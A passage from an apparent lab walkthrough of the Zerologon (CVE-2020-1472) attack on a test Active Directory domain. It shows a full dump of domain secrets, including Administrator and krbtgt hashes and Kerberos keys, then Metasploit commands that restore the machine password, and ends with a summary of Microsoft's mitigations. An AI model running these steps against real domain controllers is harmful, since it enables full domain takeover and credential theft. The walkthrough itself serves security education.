VICTIM\ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:9e247f9d42ae831376814de454b2108f81b39e395f43583ea12ee9271de260cf
VICTIM\ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:06ebbd16a649970d8d4bbc819169fad8
VICTIM\ADVICTIM2012R2$:des-cbc-md5:51fe8f7f494c8c75
VICTIM\ADVICTIM2012R2$:plain_password_hex:cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
VICTIM\ADVICTIM2012R2$:aad3b435b51404eeaad3b435b51404ee:6584bf06e7b65c680426dd1b21352f01:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xa1da827ba8bbfc007be32a602273cf084e4ecf9c
dpapi_userkey:0x2d9f40a47e6ca30622ee5a2ff26cb03c279d7611
[*] NL$KM
 0000   51 AB 90 B9 93 2B 63 98  71 C6 9E 2F BF BB 8E 1F   Q....+c.q../....
 0010   F0 55 F0 1C EF B9 3C 62  C4 7E B8 CE BB 86 B7 DB   .U....<b.~......
 0020   65 F5 AA 34 C5 57 67 F3  CF A6 02 B0 BE F9 B4 24   e..4.Wg........$
 0030   E1 87 49 70 2B 8F 82 D7  A9 B2 71 D7 21 DC 27 E5   ..Ip+.....q.!.'.
NL$KM:51ab90b9932b639871c69e2fbfbb8e1ff055f01cefb93c62c47eb8cebb86b7db65f5aa34c55767f3cfa602b0bef9b424e18749702b8f82d7a9b271d721dc27e5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:484daca6d51e63a5332b6ce83e9d24389f9f95219118efc01dd69c4bee1a032e
krbtgt:aes128-cts-hmac-sha1-96:dbbdcef9cacf1c3509e47fef1b373634
krbtgt:des-cbc-md5:bfe0453e54585b43
ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:6c4942b6eb4f1110745b39a50f77952c0e398235ed27f9c333b9753f801edd27
ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:401d7736faf7f88f22667c3d32c08bee
ADVICTIM2012R2$:des-cbc-md5:89cb6876a4c84616
AVICTIM2012R2$:aes256-cts-hmac-sha1-96:23c6b2e38221f5d84be025657a295a6026007e4c7a948f691f65ecf826750452
CAVICTIM2012R2$:aes128-cts-hmac-sha1-96:c96ad9db438b318dcf0168d4b2d2d86c
CAVICTIM2012R2$:des-cbc-md5:a79badf7ec9eb0cd
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```
Now restore the machine account password with the zerologon Metasploit module by setting the action to restore.
```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action RESTORE
action => RESTORE
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
PASSWORD => cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2e79a65c30e0ac776a3a412c38
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > options

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name      Current Setting                          Required  Description
   ----      ---------------                          --------  -----------
   NBNAME    advictim2012r2                           yes       The server's NetBIOS name
   PASSWORD  cfbb2bbc9b3a70e340d0026b250a2d3c9ea12f2  no        The password to restore for the machine account (in hex)
             e79a65c30e0ac776a3a412c38
   RHOSTS    192.168.201.9                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                                                iki/Using-Metasploit
   RPORT                                              no        The netlogon RPC port (TCP)


Auxiliary action:

   Name     Description
   ----     -----------
   RESTORE  Restore the machine account password

msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit
[*] Running module against 192.168.201.9

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9:49155 - Successfully set machine account (advictim2012r2$) password
[*] Auxiliary module execution completed
```

Job done !!!\
Machine account password restored and we grabbed all the password hashes including the Golden ticket that gives us the full domain administrator access for further exploitation.

### In summary
This again is a very easy route to comprise and gain full admin access on an Active Directory domain.\
\
Microsoft has applied two fixes to mitigate this attack.\
\
The first mitigation is to reject NetrServerAuthenticate3 requests in which the first five bytes are identical. 
However, this still allows for longer brute-force attacks (requiring an average of 2^32 attempts).\
\
The second mitigation is to reject Netlogon channels that are not signed/sealed for all Windows computer accounts.
This will completely mitigate the attack even if brute force is possible.\
\
Since, Windows Netlogon clients always seal Netlogon messages there shouldn’t be any problem.
But, Microsoft took the conservative approach and still allowed unsigned Netlogon sessions for non-Windows computer accounts.
This means that, in theory, non-Windows computer accounts are still vulnerable. 
However in the meanwhile, Microsoft has released a patch that will also reject insecure Netlogon sessions from non-Windows devices.
